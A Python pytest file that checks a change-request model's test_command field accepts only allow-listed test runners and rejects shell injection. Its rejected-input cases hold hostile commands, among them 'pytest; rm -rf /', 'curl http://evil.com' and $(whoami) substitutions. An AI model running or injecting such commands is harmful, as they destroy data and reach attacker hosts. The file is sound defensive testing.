"""Tests for RawChangeRequest.test_command validation."""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from hadron.models.cr import RawChangeRequest

# Minimal valid fields for constructing a RawChangeRequest.
_BASE = {"title": "Test CR", "description": "A change request"}


class TestAllowedCommands:
    """Allowed base commands should be accepted."""

    @pytest.mark.parametrize("cmd", [
        "pytest",
        "python -m pytest",
        "npm test",
        "npm run test",
        "npx jest",
        "yarn test",
        "pnpm test",
        "go test",
        "cargo test",
        "mvn test",
        "mvn verify",
        "gradle test",
        "gradlew test",
        "./gradlew test",
        "make test",
        "make check",
        "bundle exec rspec",
        "phpunit",
        "dotnet test",
    ])
    def test_allowed_base_command(self, cmd: str) -> None:
        cr = RawChangeRequest(**_BASE, test_command=cmd)
        assert cr.test_command == cmd


class TestAllowedCommandsWithFlags:
    """Allowed commands with trailing flags/args should pass."""

    @pytest.mark.parametrize("cmd", [
        "pytest -x --timeout=30",
        "pytest tests/unit -v --tb=short",
        "npm test -- --coverage",
        "go test ./...",
        "cargo test --release",
        "make test VERBOSE=1",
        "python -m pytest -k test_foo",
    ])
    def test_allowed_with_flags(self, cmd: str) -> None:
        cr = RawChangeRequest(**_BASE, test_command=cmd)
        assert cr.test_command == cmd


class TestShellInjectionBlocked:
    """Shell metacharacters must be rejected."""

    @pytest.mark.parametrize("cmd", [
        "pytest; rm -rf /",
        "pytest && curl evil.com",
        "pytest || true",
        "pytest | tee log.txt",
        "pytest `whoami`",
        "pytest $(whoami)",
        "pytest > /dev/null",
        "pytest < /dev/null",
        "pytest\nwhoami",
    ])
    def test_metachar_blocked(self, cmd: str) -> None:
        with pytest.raises(ValidationError, match="disallowed shell metacharacters"):
            RawChangeRequest(**_BASE, test_command=cmd)


class TestUnknownCommandBlocked:
    """Unknown base commands must be rejected."""

    @pytest.mark.parametrize("cmd", [
        "bash -c 'echo pwned'",
        "sh -c 'echo pwned'",
        "curl http://evil.com",
        "rm -rf /",
        "python evil.py",
        "node malicious.js",
    ])
    def test_unknown_base_blocked(self, cmd: str) -> None:
        with pytest.raises(ValidationError, match="test_command must start with one of"):
            RawChangeRequest(**_BASE, test_command=cmd)


class TestEmptyDefault:
    """Empty string should default to pytest."""

    def test_empty_string_defaults_to_pytest(self) -> None:
        cr = RawChangeRequest(**_BASE, test_command="")
        assert cr.test_command == "pytest"

    def test_whitespace_defaults_to_pytest(self) -> None:
        cr = RawChangeRequest(**_BASE, test_command="   ")
        assert cr.test_command == "pytest"


class TestWhitespaceStripped:
    """Leading/trailing whitespace should be stripped."""

    def test_leading_trailing_whitespace(self) -> None:
        cr = RawChangeRequest(**_BASE, test_command="  pytest -x  ")
        assert cr.test_command == "pytest -x"
